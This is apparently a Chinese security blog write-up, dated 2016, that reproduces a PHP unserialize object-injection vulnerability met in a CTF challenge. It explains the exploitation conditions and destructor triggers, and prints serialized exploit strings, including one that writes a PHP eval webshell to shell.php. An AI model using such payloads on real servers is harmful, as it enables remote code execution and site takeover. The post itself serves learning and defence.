---
title: PHP反序列化漏洞复现
tags:
  - Webshell
  - 代码执行
  - 漏洞复现
id: 241
categories:
  - 漏洞复现
date: 2016-09-16 16:12:33
---

## 导语

之前做华山杯的一道题里，在读取一个文件内容的时候，由于无法直接读取，看writeup里采用改了php反序列化的方式去读取了对应的文件，当时看有点懵逼，就去补了补PHP反序列化漏洞的原理和利用。
<!--more-->
## 正文

### 漏洞代码：

![](http://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/2016/09/00be3624e76e59c180034a9b97d6bc21.png)

### 漏洞利用条件：

1.程序中必须有一个PHP的魔术方法，比如_wakeup或者_destruct，我们需要利用这个方法，来进行攻击；

2.程序中含有PHP反序列化的函数unserialize()

3.exp需要能够保存在服务器中，如果目标服务器开启了allow_url_fopen，我们可以利用file_get_contents函数远程读取文件。

此时我们的代码中已经具备了以上的条件，可以进行PHP的对象注入了。

### exp内容：

O:3:"foo":2:{s:4:"file";s:9:"shell.php";s:4:"data";s:4:"aaaa";}

我们成功执行exp时，会在同一个目录下生成一个名叫shell.php的文件，并且文件内容为aaaa.

### 漏洞利用：

我们先通过上传之类的方法，将这个exp.txt上传到服务器当中，通过代码我们可以看出来，最后程序会将文件中的内容通过file_get_contents()函数读取出来，在程序执行完毕的时候，由于_destruct方法触发了代码执行。

![](http://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/2016/09/b45134209b152bb6b391675af4f0d156.png)

![](http://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/2016/09/6b7d6e308f929c8475228629bbaaac84.png)

在同级目录下生成了一个shell.php，且内容为aaaa

### 漏洞分析：

出现这个漏洞的时候我们可以利用它向目标服务器上写入shell：

O:3:"foo":2:{s:4:"file";s:9:"shell.php";s:4:"data";s:4:"&lt;?php @eval($_GET['BlBana'])?&gt;";}

通过这个exp，我们在shell.php写入的便是一句话。

需要注意的是，在字符串中，前面的数字代表的是后面字符串中字符的个数，如果数字与字符个数不匹配的话，就会报错，并向shell.php中写入初始内容“text”，我在不同版本的PHP中测试了这种错误。

![](http://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/2016/09/f92c2a37b60c3e1f6ddea06a651d126d.png)

![](http://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/2016/09/5603752e0c398cd84d258cb7d40d42dd.png)

在以上这两个版本中测试的时候，若我们序列化后的字符串不符合要求，就会抛出一个错误，并向shell.php中写入初始值。

![](http://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/2016/09/e26f3d61a7b5fb173797e0dd53a95417.png)

![](http://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/2016/09/4ae2cf91bd4b5c53eeef6d3a6d242888.png)

![](http://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/2016/09/aa2090e05aa0c0067950b7d0acf375dd.png)

但是在这个版本的PHP中，不会报错，但是依然是在shell.php中写入初始值。所以在利用的时候需要注意以上的内容。

* * *

现在分析一下漏洞的一些细节，这是因为我们通过GET传递了参数给session_filename这个参数中，导致之后的函数file_get_contents读取了exp.txt中的字符串，之后字符串被反序列化为了foo的数组对象，导致了代码执行。

![](http://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/2016/09/2747968806edf2c8fcc7e32d09b68783.png)

被反序列后产生的数组对象，相当于我们利用new foo（）生成了一个对象，但是，对象中的内容是以数组的形式存放的。

foo Object ( [file] =&gt; 2.txt [data] =&gt; text )

这是一个正常的数组对象，我们反序列后的字符串是

foo Object ( [file] =&gt; shell.php [data] =&gt; aaaa )

使得我们传入的恶意内容覆盖了原先数组初始值

O:3:"foo":2:{s:4:"file";s:9:"shell.php";s:4:"data";s:4:"aaaa";}
O:3:"foo":2:{s:4:"file";s:5:"2.txt";s:4:"data";s:4:"text";}

具体的序列化后的字符串如上所示。

我们成功的修改了变量$file和$data的值，这时候我们需要的是执行魔术方法_destruct()，这个方法的执行有以下集中方法：

1.当程序正常的执行完毕后，所有的对象被销毁了，析构函数被调用（<span style="color: #ff0000;">我们这里就是这种方法</span>）

<span style="color: #000000;">2.当对象没有指向时，对象被销毁</span>

$p = new foo();

$p = null;

此时析构函数执行

3.使用unset变量销毁指向对象的变量，<span style="color: #ff0000;">注意的是unset销毁的是指向对象的变量，而不是对象，只有指向同一个对象的所有变量都销毁的时候，析构函数才执行。</span>

也就是说当对象被销毁时，析构函数就会被调用。

## 总结

PHP的反序列化漏洞，可以导致远程代码的执行，漏洞产生后的后果也是十分严重的，因此在使用unserialize函数的时候应当注意漏洞形成所具备的条件，避免漏洞的产生。